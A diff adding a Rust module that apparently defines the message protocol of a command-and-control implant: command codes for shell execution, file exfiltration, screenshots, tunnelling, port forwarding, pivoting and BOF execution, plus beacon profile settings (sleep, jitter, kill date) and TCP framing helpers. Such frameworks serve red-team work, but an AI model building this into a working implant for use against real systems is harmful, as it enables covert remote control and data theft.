@@ -1,0 +1,478 @@
+#![allow(dead_code)]
+
+use serde::de::DeserializeOwned;
+use serde::{Deserialize, Serialize};
+use std::io::{self, Read, Write};
+use std::net::TcpStream;
+
+pub const WATERMARK: u32 = 0x__WATERMARK__;
+
+pub const COMMAND_ERROR: u32 = 0;
+pub const COMMAND_PWD: u32 = 1;
+pub const COMMAND_CD: u32 = 2;
+pub const COMMAND_SHELL: u32 = 3;
+pub const COMMAND_EXIT: u32 = 4;
+pub const COMMAND_DOWNLOAD: u32 = 5;
+pub const COMMAND_UPLOAD: u32 = 6;
+pub const COMMAND_CAT: u32 = 7;
+pub const COMMAND_CP: u32 = 8;
+pub const COMMAND_MV: u32 = 9;
+pub const COMMAND_MKDIR: u32 = 10;
+pub const COMMAND_RM: u32 = 11;
+pub const COMMAND_LS: u32 = 12;
+pub const COMMAND_PS: u32 = 13;
+pub const COMMAND_KILL: u32 = 14;
+pub const COMMAND_ZIP: u32 = 15;
+pub const COMMAND_SCREENSHOT: u32 = 16;
+pub const COMMAND_RUN: u32 = 17;
+pub const COMMAND_JOB_LIST: u32 = 18;
+pub const COMMAND_JOB_KILL: u32 = 19;
+pub const COMMAND_REV2SELF: u32 = 20;
+pub const COMMAND_DISKS: u32 = 21;
+pub const COMMAND_EXFIL: u32 = 22;
+pub const COMMAND_GETUID: u32 = 23;
+pub const COMMAND_LINK: u32 = 24;
+pub const COMMAND_PROFILE: u32 = 25;
+pub const COMMAND_SLEEP: u32 = 26;
+pub const COMMAND_BURST: u32 = 27;
+pub const COMMAND_TERMINATE: u32 = 28;
+pub const COMMAND_UNLINK: u32 = 29;
+pub const COMMAND_PIVOT_EXEC: u32 = 30;
+pub const COMMAND_TUNNEL_START: u32 = 31;
+pub const COMMAND_TUNNEL_STOP: u32 = 32;
+pub const COMMAND_TUNNEL_PAUSE: u32 = 33;
+pub const COMMAND_TUNNEL_RESUME: u32 = 34;
+pub const COMMAND_TERMINAL_START: u32 = 35;
+pub const COMMAND_TERMINAL_STOP: u32 = 36;
+pub const COMMAND_LPORTFWD_START: u32 = 37;
+pub const COMMAND_LPORTFWD_STOP: u32 = 38;
+pub const COMMAND_RPORTFWD_START: u32 = 39;
+pub const COMMAND_RPORTFWD_STOP: u32 = 40;
+pub const COMMAND_TUNNEL_REVERSE: u32 = 41;
+pub const COMMAND_EXEC_BOF: u32 = 50;
+pub const COMMAND_EXEC_BOF_OUT: u32 = 51;
+pub const COMMAND_EXEC_BOF_ASYNC: u32 = 52;
+
+pub const JOB_TYPE_LOCAL: u32 = 0x1;
+pub const JOB_TYPE_REMOTE: u32 = 0x2;
+pub const JOB_TYPE_PROCESS: u32 = 0x3;
+pub const JOB_TYPE_SHELL: u32 = 0x4;
+pub const JOB_TYPE_BOF: u32 = 0x5;
+
+pub const DOWNLOAD_STATE_START: u32 = 1;
+pub const DOWNLOAD_STATE_CONTINUE: u32 = 2;
+pub const DOWNLOAD_STATE_FINISH: u32 = 3;
+
+pub const INIT_PACK: i32 = 1;
+pub const EXFIL_PACK: i32 = 2;
+pub const JOB_PACK: i32 = 3;
+pub const TUNNEL_PACK: i32 = 4;
+pub const TERMINAL_PACK: i32 = 5;
+pub const BOF_PACK: i32 = 6;
+
+pub fn marshal<T: Serialize>(v: &T) -> Result<Vec<u8>, String> {
+    rmp_serde::to_vec_named(v).map_err(|e| e.to_string())
+}
+
+pub fn unmarshal<T: DeserializeOwned>(data: &[u8]) -> Result<T, String> {
+    rmp_serde::from_slice(data).map_err(|e| e.to_string())
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Profile {
+    #[serde(rename = "type")]
+    pub r#type: u32,
+    #[serde(rename = "addresses")]
+    pub addresses: Vec<String>,
+    #[serde(rename = "banner_size")]
+    pub banner_size: i32,
+    #[serde(rename = "conn_timeout")]
+    pub conn_timeout: i32,
+    #[serde(rename = "conn_count")]
+    pub conn_count: i32,
+    #[serde(rename = "use_ssl")]
+    pub use_ssl: bool,
+    #[serde(rename = "ssl_cert")]
+    pub ssl_cert: Vec<u8>,
+    #[serde(rename = "ssl_key")]
+    pub ssl_key: Vec<u8>,
+    #[serde(rename = "ca_cert")]
+    pub ca_cert: Vec<u8>,
+    #[serde(rename = "sleep")]
+    pub sleep: i32,
+    #[serde(rename = "jitter")]
+    pub jitter: i32,
+    #[serde(rename = "kill_date")]
+    pub kill_date: i64,
+    #[serde(rename = "work_start")]
+    pub work_start: i32,
+    #[serde(rename = "work_end")]
+    pub work_end: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SessionInfo {
+    #[serde(rename = "process")]
+    pub process: String,
+    #[serde(rename = "pid")]
+    pub pid: i32,
+    #[serde(rename = "user")]
+    pub user: String,
+    #[serde(rename = "host")]
+    pub host: String,
+    #[serde(rename = "ipaddr")]
+    pub ipaddr: String,
+    #[serde(rename = "elevated")]
+    pub elevated: bool,
+    #[serde(rename = "acp")]
+    pub acp: u32,
+    #[serde(rename = "oem")]
+    pub oem: u32,
+    #[serde(rename = "os")]
+    pub os: String,
+    #[serde(rename = "os_version")]
+    pub os_version: String,
+    #[serde(rename = "encrypt_key")]
+    pub encrypt_key: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Message {
+    #[serde(rename = "type")]
+    pub r#type: i8,
+    #[serde(rename = "object")]
+    pub object: Vec<Vec<u8>>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Command {
+    #[serde(rename = "code")]
+    pub code: u32,
+    #[serde(rename = "id")]
+    pub id: u32,
+    #[serde(rename = "data")]
+    pub data: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct StartMsg {
+    #[serde(rename = "id")]
+    pub id: i32,
+    #[serde(rename = "data")]
+    pub data: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct InitPack {
+    #[serde(rename = "id")]
+    pub id: u32,
+    #[serde(rename = "type")]
+    pub r#type: u32,
+    #[serde(rename = "data")]
+    pub data: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsError {
+    #[serde(rename = "error")]
+    pub error: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsPwd {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsCd {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsShell {
+    #[serde(rename = "program")]
+    pub program: String,
+    #[serde(rename = "args")]
+    pub args: Vec<String>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsShell {
+    #[serde(rename = "output")]
+    pub output: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsDownload {
+    #[serde(rename = "task")]
+    pub task: String,
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsDownload {
+    #[serde(rename = "id")]
+    pub file_id: i32,
+    #[serde(rename = "path")]
+    pub path: String,
+    #[serde(rename = "size")]
+    pub size: i32,
+    #[serde(rename = "content")]
+    pub content: Vec<u8>,
+    #[serde(rename = "start")]
+    pub start: bool,
+    #[serde(rename = "finish")]
+    pub finish: bool,
+    #[serde(rename = "canceled")]
+    pub canceled: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsUpload {
+    #[serde(rename = "path")]
+    pub path: String,
+    #[serde(rename = "content")]
+    pub content: Vec<u8>,
+    #[serde(rename = "finish")]
+    pub finish: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsUpload {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsCat {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsCat {
+    #[serde(rename = "path")]
+    pub path: String,
+    #[serde(rename = "content")]
+    pub content: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsCp {
+    #[serde(rename = "src")]
+    pub src: String,
+    #[serde(rename = "dst")]
+    pub dst: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsMv {
+    #[serde(rename = "src")]
+    pub src: String,
+    #[serde(rename = "dst")]
+    pub dst: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsMkdir {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsRm {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsLs {
+    #[serde(rename = "path")]
+    pub path: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct FileInfo {
+    #[serde(rename = "mode")]
+    pub mode: String,
+    #[serde(rename = "nlink")]
+    pub nlink: i32,
+    #[serde(rename = "user")]
+    pub user: String,
+    #[serde(rename = "group")]
+    pub group: String,
+    #[serde(rename = "size")]
+    pub size: i64,
+    #[serde(rename = "date")]
+    pub date: String,
+    #[serde(rename = "filename")]
+    pub filename: String,
+    #[serde(rename = "is_dir")]
+    pub is_dir: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsLs {
+    #[serde(rename = "result")]
+    pub result: bool,
+    #[serde(rename = "status")]
+    pub status: String,
+    #[serde(rename = "path")]
+    pub path: String,
+    #[serde(rename = "files")]
+    pub files: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsKill {
+    #[serde(rename = "pid")]
+    pub pid: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsRun {
+    #[serde(rename = "program")]
+    pub program: String,
+    #[serde(rename = "args")]
+    pub args: Vec<String>,
+    #[serde(rename = "task")]
+    pub task: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsRun {
+    #[serde(rename = "stdout")]
+    pub stdout: String,
+    #[serde(rename = "stderr")]
+    pub stderr: String,
+    #[serde(rename = "pid")]
+    pub pid: i32,
+    #[serde(rename = "start")]
+    pub start: bool,
+    #[serde(rename = "finish")]
+    pub finish: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct JobInfo {
+    #[serde(rename = "job_id")]
+    pub job_id: String,
+    #[serde(rename = "job_type")]
+    pub job_type: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsJobList {
+    #[serde(rename = "list")]
+    pub list: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsJobKill {
+    #[serde(rename = "id")]
+    pub id: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DriveInfo {
+    #[serde(rename = "name")]
+    pub name: String,
+    #[serde(rename = "type")]
+    pub drive_type: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsDisks {
+    #[serde(rename = "drives")]
+    pub drives: Vec<u8>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsGetuid {
+    #[serde(rename = "username")]
+    pub username: String,
+    #[serde(rename = "domain")]
+    pub domain: String,
+    #[serde(rename = "elevated")]
+    pub elevated: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsProfile {
+    #[serde(rename = "subcmd")]
+    pub subcmd: i32,
+    #[serde(rename = "int_value")]
+    pub int_value: i32,
+    #[serde(rename = "str_value")]
+    pub str_value: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsProfile {
+    #[serde(rename = "subcmd")]
+    pub subcmd: i32,
+    #[serde(rename = "int_value")]
+    pub int_value: i32,
+    #[serde(rename = "str_value")]
+    pub str_value: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsSleep {
+    #[serde(rename = "sleep")]
+    pub sleep: i32,
+    #[serde(rename = "jitter")]
+    pub jitter: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsSleep {
+    #[serde(rename = "sleep")]
+    pub sleep: i32,
+    #[serde(rename = "jitter")]
+    pub jitter: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ParamsBurst {
+    #[serde(rename = "subcmd")]
+    pub subcmd: i32,
+    #[serde(rename = "enabled")]
+    pub enabled: i32,
+    #[serde(rename = "sleep")]
+    pub sleep: i32,
+    #[serde(rename = "jitter")]
+    pub jitter: i32,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct AnsBurst {
+    #[serde(rename = "enabled")]
+    pub enabled: i32,
+    #[serde(rename = "sleep")]
+    pub sleep: i32,
+    #[serde(rename = "jitter")]
+    pub jitter: i32,
+}
+
+pub fn tcp_send_msg(stream: &mut TcpStream, data: &[u8]) -> io::Result<()> {
+    let len = data.len() as u32;
+    stream.write_all(&len.to_be_bytes())?;
+    stream.write_all(data)?;
+    stream.flush()
+}
+
+pub fn tcp_recv_msg(stream: &mut TcpStream) -> io::Result<Vec<u8>> {
+    let mut hdr = [0u8; 4];
+    stream.read_exact(&mut hdr)?;
+    let len = u32::from_be_bytes(hdr) as usize;
+    if len == 0 {
+        return Ok(Vec::new());
+    }
+    let mut buf = vec![0u8; len];
+    stream.read_exact(&mut buf)?;
+    Ok(buf)
+}
